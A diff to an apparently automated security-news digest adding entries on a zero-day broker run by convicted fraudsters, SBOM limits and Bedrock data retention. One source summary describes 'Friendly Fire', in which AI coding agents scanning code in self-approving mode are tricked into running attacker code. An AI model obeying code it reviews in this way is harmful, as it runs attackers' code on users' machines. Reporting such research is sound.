 - Title: Security Teams Are Ready To Become More Preemptive. What’s Holding Them Back?
@@ -2066,6 +2117,51 @@ Back to Blog Security Operations A Day With Your Vector Command Red Team Pod Tre
   - Link: https://www.rapid7.com/blog/post/so-ditl-day-with-your-vector-command-red-team-pod
   - Summary: Anyone trying to understand continuous red teaming usually gets the same high-level explanation: it is ongoing, attacker-informed, and designed to uncover risk between formal assessments. Useful as that description is, it still leaves most people with the same question, which is what the service actually looks like when a team is working against a real environment day after day. A Vector Command pod answers that question more clearly than a list of features ever could. Five dedicated operators work against a customer environment continuously, each bringing a different specialty, while the pod as a whole simulates the range, coordination, and persistence of a real adversary. Over time, that gives the customer far more than a periodic snapshot. It gives them a team that keeps learning the environment, keeps pressure on the attack surface, and keeps surfacing the kinds of changes that can turn into incidents if no one catches them quickly. Because the environment keeps changing, the value
 
+### Cluster ce7170bd38 — score 10
+
+- Title: Felons, Fraudsters Flog Offensive Cybersecurity Startup
+- Source: Krebs on Security (practitioner_analysis)
+- Published: 2026-07-08T12:31:39+00:00
+- Link: https://krebsonsecurity.com/2026/07/felons-fraudsters-flog-offensive-cybersecurity-startup/
+- Fetch status: ok
+- Member count: 1
+- Corroborating source count: 1
+- Strong signals: (none)
+
+#### Cluster taxonomy (union across members)
+- threat_categories: zero_day
+- affected_industries: education, government, telecommunications
+- urgency_signals: zero_day
+- content_type: news_report
+- confidence_tier: tier_3_analysis
+
+#### Primary article taxonomy
+- threat_categories: zero_day
+- affected_industries: government, telecommunications, education
+- urgency_signals: zero_day
+- content_type: news_report
+- confidence_tier: tier_3_analysis
+
+#### Summary
+
+```
+A cybersecurity startup dangling millions of dollars to acquire zero-day security vulnerabilities in popular software is run by a pair of far-right conspiracy theorists and convicted felons whose most recent ventures included fake intelligence companies and a now-defunct AI-based lobbying platform they operated under assumed names.
+```
+
+#### Full body
+
+```
+A cybersecurity startup dangling millions of dollars to acquire zero-day security vulnerabilities in popular software is run by a pair of far-right conspiracy theorists and convicted felons whose most recent ventures included fake intelligence companies and a now-defunct AI-based lobbying platform they operated under assumed names. The X/Twitter account IRIS C2 (@C2IRIS) has gained more than 4,000 followers since its creation in January 2025, posting frequently about security vulnerabilities, AI and software exploits. IRIS C2 says it is a company in McLean, Va. that sells offensive cybersecurity capabilities. The IRIS C2 website dangles the possibility of million-dollar payouts for exploits to attract talent. “Our business model is this,” reads a pinned post on top of the IRIS C2 account on X. “Attract the very best vulnerability researchers and exploit developers in the world to join our company. This mostly revolves around junior engineers with raw talent/extremely high IQ. We don’t care if they have a college degree/industry experience.” The website linked in that profile — irisc2[.]com — says the company is hiring for a number of open positions, and a recent post on its LinkedIn page enthuses about an overwhelming number of applications from potential employees. The website claims IRIS C2 is in the business of acquiring “zero-day exploits, individual primitives, partial chains, and full capabilities across all major platforms. Payouts range from $10,000 to $7 million depending on target, reliability, and operational value.” The government contracting portal g2exchange.com reports that irisc2[.]com is operated by a business based in Virginia called Calvexa Group LLC . The “contact” link on the website for Calvexa Group — calvexagroup[.]com — forwards visitors to irisc2[.]com. G2Exchange shows that while Calvexa Group LLC is registered as a federal contractor, it does not appear to be working on any direct government contracts. A search on the Arlington, Va. address listed in the incorporation records for Calvexa Group LLC finds the property is occupied by Jack Burkman , the 60-year-old founder and managing partner of the lobbying firm Burkman & Associates . When approached with questions about IRIS C2, Burkman referred further inquiries to his longtime associate, 28-year-old Jacob Wohl . Jack Burkman (left) and Jacob Wohl, at a press conference in August 2020. Image: Wikipedia. Burkman and Wohl have a storied history of creating fake intelligence companies and using them to spread false claims about and frame public figures, including fabricated sexual assault claims against then FBI director Robert Mueller , and Pete Buttigieg , then mayor of South Bend, Indiana and a Democratic candidate for the presidency. In 2019, Burkman and Wohl held press conferences falsely alleging extramarital affairs by Sen. Elizabeth Warren (D-Mass.) and then-2020 presidential candidate Kamala Harris . In the wake of the 2020 presidential election, Wohl and Burkman were prosecuted by multiple U.S. states for making thousands of robocalls to residents of battleground states and disseminating false claims about mail-in ballots. They were indicted in Cleveland on 15 felony counts of orchestrating a robocall scheme aimed at suppressing the black vote in Detroit, and were sentenced in late 2025 to probation after their appeals to dismiss the charges were rejected. In 2022, Wohl and Burkman both pleaded guilty to a single felony charge of telecommunications fraud in Ohio, and sentenced to a fine, probation, and community service. In March 2023, a judge in a New York civil case ruled that Wohl and Burkman had violated federal and state civil rights laws, and the two agreed to pay a $1 million settlement. In June 2023, the Federal Communications Commission (FCC) imposed a $5.1 million fine against Wohl and Burkman for their robocall campaigns, at the time the largest fine ever sought by the FCC under the Telephone Consumer Protection Act. Jacob “Jay” Wo
+```
+
+#### Corroborating sources (1)
+
+- **Krebs on Security** (practitioner_analysis)
+  - Title: Felons, Fraudsters Flog Offensive Cybersecurity Startup
+  - Published: 2026-07-08T12:31:39+00:00
+  - Link: https://krebsonsecurity.com/2026/07/felons-fraudsters-flog-offensive-cybersecurity-startup/
+  - Summary: A cybersecurity startup dangling millions of dollars to acquire zero-day security vulnerabilities in popular software is run by a pair of far-right conspiracy theorists and convicted felons whose most recent ventures included fake intelligence companies and a now-defunct AI-based lobbying platform they operated under assumed names.
+
 ### Cluster aa4a893323 — score 10
 
 - Title: Unpatched XRING Flaw in XQUIC Lets Remote Clients Crash HTTP/3 Servers
@@ -2112,51 +2208,6 @@ Unpatched XRING Flaw in XQUIC Lets Remote Clients Crash HTTP/3 Servers  Swati
   - Published: 2026-07-10T11:47:43+00:00
   - Link: https://thehackernews.com/2026/07/unpatched-xring-flaw-in-xquic-lets.html
   - Summary: A single wrong variable on one line in XQUIC, Alibaba's QUIC and HTTP/3 library, lets any remote client crash the server with a short burst of completely legal traffic. There is no patch. FoxIO researcher Sébastien Féry disclosed the flaw on July 8 and nicknamed it XRING. He says it needs no login and no malformed packets: about 260 bytes of ordinary QPACK traffic takes the server
-
-### Cluster ce7170bd38 — score 10
-
-- Title: Felons, Fraudsters Flog Offensive Cybersecurity Startup
-- Source: Krebs on Security (practitioner_analysis)
-- Published: 2026-07-08T12:31:39+00:00
-- Link: https://krebsonsecurity.com/2026/07/felons-fraudsters-flog-offensive-cybersecurity-startup/
-- Fetch status: ok
-- Member count: 1
-- Corroborating source count: 1
-- Strong signals: (none)
-
-#### Cluster taxonomy (union across members)
-- threat_categories: zero_day
-- affected_industries: education, government, telecommunications
-- urgency_signals: zero_day
-- content_type: news_report
-- confidence_tier: tier_3_analysis
-
-#### Primary article taxonomy
-- threat_categories: zero_day
-- affected_industries: government, telecommunications, education
-- urgency_signals: zero_day
-- content_type: news_report
-- confidence_tier: tier_3_analysis
-
-#### Summary
-
-```
-A cybersecurity startup dangling millions of dollars to acquire zero-day security vulnerabilities in popular software is run by a pair of far-right conspiracy theorists and convicted felons whose most recent ventures included fake intelligence companies and a now-defunct AI-based lobbying platform they operated under assumed names.
-```
-
-#### Full body
-
-```
-A cybersecurity startup dangling millions of dollars to acquire zero-day security vulnerabilities in popular software is run by a pair of far-right conspiracy theorists and convicted felons whose most recent ventures included fake intelligence companies and a now-defunct AI-based lobbying platform they operated under assumed names. The X/Twitter account IRIS C2 (@C2IRIS) has gained more than 4,000 followers since its creation in January 2025, posting frequently about security vulnerabilities, AI and software exploits. IRIS C2 says it is a company in McLean, Va. that sells offensive cybersecurity capabilities. The IRIS C2 website dangles the possibility of million-dollar payouts for exploits to attract talent. “Our business model is this,” reads a pinned post on top of the IRIS C2 account on X. “Attract the very best vulnerability researchers and exploit developers in the world to join our company. This mostly revolves around junior engineers with raw talent/extremely high IQ. We don’t care if they have a college degree/industry experience.” The website linked in that profile — irisc2[.]com — says the company is hiring for a number of open positions, and a recent post on its LinkedIn page enthuses about an overwhelming number of applications from potential employees. The website claims IRIS C2 is in the business of acquiring “zero-day exploits, individual primitives, partial chains, and full capabilities across all major platforms. Payouts range from $10,000 to $7 million depending on target, reliability, and operational value.” The government contracting portal g2exchange.com reports that irisc2[.]com is operated by a business based in Virginia called Calvexa Group LLC . The “contact” link on the website for Calvexa Group — calvexagroup[.]com — forwards visitors to irisc2[.]com. G2Exchange shows that while Calvexa Group LLC is registered as a federal contractor, it does not appear to be working on any direct government contracts. A search on the Arlington, Va. address listed in the incorporation records for Calvexa Group LLC finds the property is occupied by Jack Burkman , the 60-year-old founder and managing partner of the lobbying firm Burkman & Associates . When approached with questions about IRIS C2, Burkman referred further inquiries to his longtime associate, 28-year-old Jacob Wohl . Jack Burkman (left) and Jacob Wohl, at a press conference in August 2020. Image: Wikipedia. Burkman and Wohl have a storied history of creating fake intelligence companies and using them to spread false claims about and frame public figures, including fabricated sexual assault claims against then FBI director Robert Mueller , and Pete Buttigieg , then mayor of South Bend, Indiana and a Democratic candidate for the presidency. In 2019, Burkman and Wohl held press conferences falsely alleging extramarital affairs by Sen. Elizabeth Warren (D-Mass.) and then-2020 presidential candidate Kamala Harris . In the wake of the 2020 presidential election, Wohl and Burkman were prosecuted by multiple U.S. states for making thousands of robocalls to residents of battleground states and disseminating false claims about mail-in ballots. They were indicted in Cleveland on 15 felony counts of orchestrating a robocall scheme aimed at suppressing the black vote in Detroit, and were sentenced in late 2025 to probation after their appeals to dismiss the charges were rejected. In 2022, Wohl and Burkman both pleaded guilty to a single felony charge of telecommunications fraud in Ohio, and sentenced to a fine, probation, and community service. In March 2023, a judge in a New York civil case ruled that Wohl and Burkman had violated federal and state civil rights laws, and the two agreed to pay a $1 million settlement. In June 2023, the Federal Communications Commission (FCC) imposed a $5.1 million fine against Wohl and Burkman for their robocall campaigns, at the time the largest fine ever sought by the FCC under the Telephone Consumer Protection Act. Jacob “Jay” Wo
-```
-
-#### Corroborating sources (1)
-
-- **Krebs on Security** (practitioner_analysis)
-  - Title: Felons, Fraudsters Flog Offensive Cybersecurity Startup
-  - Published: 2026-07-08T12:31:39+00:00
-  - Link: https://krebsonsecurity.com/2026/07/felons-fraudsters-flog-offensive-cybersecurity-startup/
-  - Summary: A cybersecurity startup dangling millions of dollars to acquire zero-day security vulnerabilities in popular software is run by a pair of far-right conspiracy theorists and convicted felons whose most recent ventures included fake intelligence companies and a now-defunct AI-based lobbying platform they operated under assumed names.
 
 ### Cluster 98dd5f4721 — score 10
 
@@ -2311,6 +2362,49 @@ Anyone who deals with phishing messages caught by basic security filters knows t
   - Published: 2026-07-10T09:09:29+00:00
   - Link: https://isc.sans.edu/diary/rss/33144
   - Summary: Anyone who deals with phishing messages caught by basic security filters knows that most phishing samples tend to blend into one another, since only a small set of techniques and approaches keeps reappearing in them. That is precisely why it is worth pausing on the occasional message that does something a little out of the ordinary.
+
+### Cluster 8b336fe756 — score 9
+
+- Title: Why SBOMs, signing, and provenance still don’t tell you if software is safe
+- Source: Help Net Security (cyber_news_breach_reporting)
+- Published: 2026-07-13T06:30:20+00:00
+- Link: https://www.helpnetsecurity.com/2026/07/13/sbom-zero-trust-for-code/
+- Fetch status: ok
+- Member count: 1
+- Corroborating source count: 1
+- Strong signals: (none)
+
+#### Cluster taxonomy (union across members)
+- threat_categories: supply_chain
+- affected_industries: critical_infrastructure, education, government
+- content_type: news_report
+- confidence_tier: tier_4_news
+
+#### Primary article taxonomy
+- threat_categories: supply_chain
+- affected_industries: government, critical_infrastructure, education
+- content_type: news_report
+- confidence_tier: tier_4_news
+
+#### Summary
+
+```
+We have made real progress in software supply chain security, improving visibility into software components, authenticity and build integrity. Much of this progress traces back to Executive Order 14028, which pushed agencies, contractors and enterprises to invest in SBOMs, signing and provenance. All of that matters, but it is not enough. The current software trust model still stops short of the question that determines risk at execution: What is this code capable of doing if … More → The post Why SBOMs, signing, and provenance still don’t tell you if software is safe appeared first on Help Net Security .
+```
+
+#### Full body
+
+```
+Ken Ammon, CEO, CodeHunter July 13, 2026 Share Why SBOMs, signing, and provenance still don’t tell you if software is safe We have made real progress in software supply chain security, improving visibility into software components, authenticity and build integrity. Much of this progress traces back to Executive Order 14028 , which pushed agencies, contractors and enterprises to invest in SBOMs , signing and provenance. All of that matters, but it is not enough. The current software trust model still stops short of the question that determines risk at execution: What is this code capable of doing if it runs? This blind spot is becoming harder to ignore as AI changes the speed, scale and variability of malicious software. University of Toronto research demonstrated an AI-powered worm capable of adapting its attack strategy as it moves through a network. Unlike traditional worms that exploit a fixed vulnerability, this prototype can reason through new attack paths and tailor its behavior to different systems. The June 2026 AI executive order on cybersecurity reflects federal concern. But the issue is broader than policy: traditional trust models are insufficient when AI generates, modifies and deploys code faster than human review can keep up. We can no longer trust software based primarily on what it is, where it came from or whether it resembles something seen before. Visibility is not trust SBOMs answer an important question: What is inside this software? Organizations cannot manage dependencies, open-source exposure or known vulnerable components if they do not know what is inside a build. But composition is not behavior. A package can have a clean dependency tree and still perform dangerous actions. An application can include expected libraries and still attempt credential access, persistence, lateral movement, file modification or data exfiltration. SBOMs help security teams understand ingredients, but they do not predict what software will do once it executes. Context matters. File deletion may be legitimate in a disk cleanup utility and catastrophic in an office macro. Credential access is expected in a password manager, but not in a package dependency. That is the limitation of composition-based trust: knowing what software contains does not tell you what it can do once it runs. Authentic does not mean safe Signing and provenance answer different questions. Can we verify who published this software? Can we confirm where it came from? Can we determine whether the build followed expected steps? Those controls improve integrity, accountability, compliance and auditability. But authenticity is not the same as trustworthiness. Signed software can still behave maliciously. A trusted vendor update can be compromised. A legitimate build process can produce an artifact that violates enterprise policy. An AI coding agent can generate code that functions correctly while introducing unintended security consequences. Most security programs still assume that if software is signed, came through an approved pipeline or originated from a known repository, it is safe. That may be reasonable as a first filter, but it is a dangerous final decision. This approach made sense when software changed slowly and malicious code had recognizable indicators. AI is now generating, modifying and deploying code at unprecedented speed. Validating where software came from does not tell us whether it should run. The missing fourth pillar Government supply chain security frameworks have helped formalize essential controls around software origin, integrity and build process. What they have not fully addressed is behavior. Software supply chain security must now answer four questions: What is inside the software? Can we trust where it came from? How was it built? What can it do? The fourth question increasingly determines security outcomes because software inherits the privileges of the user, workload, service account or automation context that launches it. O
+```
+
+#### Corroborating sources (1)
+
+- **Help Net Security** (cyber_news_breach_reporting)
+  - Title: Why SBOMs, signing, and provenance still don’t tell you if software is safe
+  - Published: 2026-07-13T06:30:20+00:00
+  - Link: https://www.helpnetsecurity.com/2026/07/13/sbom-zero-trust-for-code/
+  - Summary: We have made real progress in software supply chain security, improving visibility into software components, authenticity and build integrity. Much of this progress traces back to Executive Order 14028, which pushed agencies, contractors and enterprises to invest in SBOMs, signing and provenance. All of that matters, but it is not enough. The current software trust model still stops short of the question that determines risk at execution: What is this code capable of doing if … More → The post Why SBOMs, signing, and provenance still don’t tell you if software is safe appeared first on Help Net Security .
 
 ### Cluster 5450cf5765 — score 9
 
@@ -2485,6 +2579,58 @@ An MCP powered system that's continuously finding and reproducing vulns, improve
   - Published: 2026-07-09T14:30:00+00:00
   - Link: https://tldrsec.com/p/tldr-sec-336
   - Summary: An MCP powered system that's continuously finding and reproducing vulns, improvements to Datadog's OSS malware hunting tool, Hakluke muses on the future of bug bounty
+
+### Cluster 8fe87a7b65 — score 9
+
+- Title: Enforce zero data retention on Amazon Bedrock with Bedrock Projects and service control policies
+- Source: AWS Security Blog (cloud_identity_infrastructure)
+- Published: 2026-07-07T18:18:52+00:00
+- Link: https://aws.amazon.com/blogs/security/enforce-zero-data-retention-on-amazon-bedrock-with-bedrock-projects-and-service-control-policies/
+- Fetch status: ok
+- Member count: 4
+- Corroborating source count: 3
+- Strong signals: Anthropic/Claude
+
+#### Cluster taxonomy (union across members)
+- threat_categories: data_breach, ransomware_extortion
+- affected_products: AWS, Anthropic/Claude, OpenAI/ChatGPT
+- content_type: news_report
+- confidence_tier: tier_2_operator, tier_4_news
+
+#### Primary article taxonomy
+- affected_products: AWS, Anthropic/Claude
+- content_type: news_report
+- confidence_tier: tier_2_operator
+
+#### Summary
+
+```
+With the introduction of models that require data sharing with third-party providers—such as Claude Fable 5—organizations need a way to centrally enforce data retention policies. Amazon Bedrock gives you control over whether your prompts and model outputs are retained after an inference request completes. You might need a way to enforce your retention settings across […]
+```
+
+#### Full body
+
+```
+AWS Security Blog Enforce zero data retention on Amazon Bedrock with Bedrock Projects and service control policies With the introduction of models that require data sharing with third-party providers—such as Claude Fable 5—organizations need a way to centrally enforce data retention policies. Amazon Bedrock gives you control over whether your prompts and model outputs are retained after an inference request completes. You might need a way to enforce your retention settings across all accounts and have granular control of project data retention when compatible with the selected model. In this blog post, I walk you through how Amazon Bedrock data retention modes work, the tools available for managing retention—including Amazon Bedrock Projects and service control policies (SCPs)—and how to verify your policy settings are working correctly. In this post, you will learn: How Amazon Bedrock data retention modes work and what each mode means for your data How to use Amazon Bedrock Projects with compatible models to isolate workloads with different retention needs How to write and deploy an SCP that prevents anyone in your organization from enabling data sharing How data retention modes interact with cross-Region inference profiles How to verify your configuration is working correctly Understanding data retention modes You can use Amazon Bedrock to control data retention through a mode setting on your account. This determines what happens to your prompts and outputs after each inference request, which is important to understand as you assess your compliance needs. Not all models require data retention or data sharing, and you might continue to use Amazon Bedrock with models that don’t require data retention or data sharing. See the Amazon Bedrock documentation for the current list of models that require data retention or data sharing. Ultimately, it’s your responsibility as the customer to select models that align with your compliance needs. Important Note : To help stop the dissemination of child sexual abuse material (“CSAM”), Amazon Bedrock uses automated mechanisms to identify CSAM in model input/output. We may store and review flagged content to determine if it is CSAM for reporting purposes, even when mode is none. The following modes govern how Amazon Bedrock handles your data: Mode Behavior Data shared with provider none Zero data retention. Prompts and responses are processed and immediately discarded. No default No data is shared with model providers. Some models might require data retention for trust and safety checks for up to 30 days. Consult the model’s terms for specifics. This mode also allows APIs that inherently require retention (for example, Batch API, Responses API with store=true). Models that support zero retention will still operate with zero retention. No inherit No explicit setting applied, defers to the next higher scope (project defers to account defers to service default). This is the default for new accounts. No provider_data_share Data is shared with the model provider and retained for up to 30 days for trust and safety. Yes Understanding mode as a ceiling, not a floor The most important concept to understand: your configured mode is the upper limit of retention you’re willing to accept ; it is not what every request will use. Setting your account to provider_data_share doesn’t mean all your requests suddenly start retaining and sharing data. Models that support zero data retention will still operate with zero retention regardless of your account-level setting. Think of it as a permissions ceiling: Your account mode Model you invoke What happens provider_data_share Claude Sonnet (supports none) Zero retention, Sonnet doesn’t require data sharing or data retention provider_data_share Claude Fable 5 (requires provider_data_share ) Data retained for up to 30 days and might be shared with provider, Fable 5 requires data sharing and data retention none Claude Sonnet (supports none ) Zero retention, no data s
+```
+
+#### Corroborating sources (3)
+
+- **AWS Security Blog** (cloud_identity_infrastructure)
+  - Title: Enforce zero data retention on Amazon Bedrock with Bedrock Projects and service control policies
+  - Published: 2026-07-07T18:18:52+00:00
+  - Link: https://aws.amazon.com/blogs/security/enforce-zero-data-retention-on-amazon-bedrock-with-bedrock-projects-and-service-control-policies/
+  - Summary: With the introduction of models that require data sharing with third-party providers—such as Claude Fable 5—organizations need a way to centrally enforce data retention policies. Amazon Bedrock gives you control over whether your prompts and model outputs are retained after an inference request completes. You might need a way to enforce your retention settings across […]
+- **SecurityWeek** (cyber_news_breach_reporting)
+  - Title: In Other News: DHS Database Hacked, Adobe Boosts Patch Cadence, Canada Disrupts Ransomware Ops
+  - Published: 2026-07-10T15:01:19+00:00
+  - Link: https://www.securityweek.com/in-other-news-dhs-database-hacked-adobe-boosts-patch-cadence-canada-disrupts-ransomware-ops/
+  - Summary: Other noteworthy stories that might have slipped under the radar: Abnormal AI sued by Anthropic, AssuranceAmerica data breach affects 7 million people, NSA brings back TAO. The post In Other News: DHS Database Hacked, Adobe Boosts Patch Cadence, Canada Disrupts Ransomware Ops appeared first on SecurityWeek .
+- **The Hacker News** (cyber_news_breach_reporting)
+  - Title: Top AI Agents Built to Catch Malicious Code Can Be Tricked Into Running It
+  - Published: 2026-07-09T05:15:02+00:00
+  - Link: https://thehackernews.com/2026/07/friendly-fire-ai-agents-built-to-catch.html
+  - Summary: Ask an AI coding agent to scan open-source code for security holes, and it might run the attacker's code on your own machine instead. That is the finding in a proof-of-concept published Wednesday by the AI Now Institute, an attack it calls "Friendly Fire." It works against Anthropic's Claude Code and OpenAI's Codex when either is running in an autonomous mode that approves its own
 
 ### Cluster 551c9fa70a — score 9
 
@@ -2742,47 +2888,6 @@ Home Blog Meta Phishers Abuse Business Account Manager Service Published: July 7
   - Published: 2026-07-07T12:00:00+00:00
   - Link: https://www.huntress.com/blog/meta-business-manager-phishing
   - Summary: Huntress is tracking a threat actor group as they evolve a phishing attack that uses a Facebook feature to send the initial spam lure.
-
-### Cluster 86683d13c6 — score 8
-
-- Title: Plain Text Passwords: The Risks of Storing Them
-- Source: Huntress (detection_response_operations)
-- Published: 2026-07-06T04:00:00+00:00
-- Link: https://www.huntress.com/blog/dangers-of-storing-unencrypted-passwords
-- Fetch status: ok
-- Member count: 1
-- Corroborating source count: 1
-- Strong signals: (none)
-
-#### Cluster taxonomy (union across members)
-- threat_categories: mfa_bypass
-- content_type: news_report
-- confidence_tier: tier_2_operator
-
-#### Primary article taxonomy
-- threat_categories: mfa_bypass
-- content_type: news_report
-- confidence_tier: tier_2_operator
-
-#### Summary
-
-```
-Plain text passwords are a critical security risk. See a real attack where exposed credentials led to a breach and how Huntress helps prevent it.
-```
-
-#### Full body
-
-```
-Home Blog Plain Text Passwords: The Risks of Storing Them Last Updated: July 6, 2026 Plain Text Passwords: The Risks of Storing Them By: Michael Elford Chad Hudson Summarize with AI Summarize ChatGPT Claude Perplexity Google AI A plain text password is any password stored or sent in its original, readable form, with no encryption or hashing standing between it and anyone who finds it. If a file, spreadsheet, database, or email shows the password exactly as it was typed, it's in plain text. For lean IT teams juggling a dozen priorities at once, this is an easy mistake to make and an easy one to miss. A password gets copied into a spreadsheet during onboarding. A recovery code gets saved as a text file "just for now" and never moved. None of it feels risky until a threat actor finds it. That's exactly what happened to a Huntress partner. Later in this article, we walk through how a single plain text file on a security engineer's desktop gave a threat actor full access to their Huntress portal, and what your team can do so it doesn't happen to yours. What is a plain text password? A plain text password is stored or transmitted exactly as entered, with no encryption or hashing applied. If someone can open the file or message and read the password outright, it's in plain text, full stop. Plain text vs. clear text vs. unencrypted Plain text, clear text, and unencrypted password all describe the same problem. They're different names for a credential stored or sent in a readable, unprotected format with nothing shielding it if someone gets into where it lives. You'll see "clear text password" used just as often as "plain text password" in security write-ups. The risk behind either term is identical: anyone who can view the file, database, or message can read the password outright. What is a hashed password & why it matters Hashing runs a password through a one-way function that turns it into a fixed-length string of characters. Unlike encryption, hashing can't be reversed. There's no key that turns a hash back into the original password, which is exactly why it's the standard for storing credentials safely. Security teams recommend hashing algorithms built specifically for passwords, like Argon2 and bcrypt, rather than general-purpose encryption or, worse, no protection at all. Salting adds another layer of protection. A random value gets added to the password before it's hashed, so two identical passwords produce two different hashes. This defeats rainbow table attacks, where threat actors use precomputed tables of common password hashes to reverse-engineer credentials in bulk. Why plain text password storage is dangerous Storing credentials in plain text hands a threat actor everything they need the moment they find the file. Here's what that exposure actually leads to. Data breaches: A single exposed file or database can hand over every credential inside it at once. There's no cracking or guessing required. The threat actor just reads what's there. Insider threats: Plain text credentials aren't just at risk from outside attackers. Anyone with access to the file, current employees, contractors, or former staff whose access wasn't revoked, can read and misuse them. Credential reuse: People reuse passwords across personal and work accounts more often than IT teams would like. One exposed plain text password can open doors to other accounts and systems that were never part of the original target. MFA bypass: Recovery codes and backup credentials exist to get users back into their accounts when multi-factor authentication (MFA) fails them. Stored in plain text, those same codes let a threat actor skip MFA entirely and log in as if they were the legitimate user. Two signals are worth watching for. If a service ever emails you your actual password instead of a reset link, that's a sign they're storing it in plain text on their end, not just yours. And if your own team stores credentials or recovery codes in a spreadsheet or a desktop text
-```
-
-#### Corroborating sources (1)
-
-- **Huntress** (detection_response_operations)
-  - Title: Plain Text Passwords: The Risks of Storing Them
-  - Published: 2026-07-06T04:00:00+00:00
-  - Link: https://www.huntress.com/blog/dangers-of-storing-unencrypted-passwords
-  - Summary: Plain text passwords are a critical security risk. See a real attack where exposed credentials led to a breach and how Huntress helps prevent it.
 
 ### Cluster 019b56ecce — score 8
 
